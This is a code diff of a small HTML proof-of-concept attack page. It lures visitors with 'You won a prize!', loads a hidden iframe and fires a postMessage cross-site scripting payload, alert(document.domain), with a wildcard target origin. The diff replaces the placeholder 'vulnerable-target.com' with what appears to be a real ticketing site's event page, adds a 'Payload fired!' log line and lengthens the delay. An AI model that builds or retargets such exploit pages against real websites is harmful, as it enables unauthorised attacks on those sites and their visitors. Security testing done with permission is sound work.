@@ -2,7 +2,7 @@
 <html>
 <body>
     <h1>You won a prize!</h1>
-    <iframe id="targetApp" src="https://vulnerable-target.com/page" style="display:none;"></iframe>
+    <iframe id="targetApp" src="https://www.district.in/events/ye-live-in-india-2026-buy-tickets" style="display:none;"></iframe>
     
     <script>
         // Wait for the iframe to load, then fire the payload
@@ -10,7 +10,8 @@
             var target = document.getElementById('targetApp').contentWindow;
             // The '*' allows the message to be sent regardless of target origin
             target.postMessage(''-alert(document.domain)-'', '*');
-        }, 3000);
+            console.log("Payload fired!");
+        }, 25000);
     </script>
 </body>
 </html>
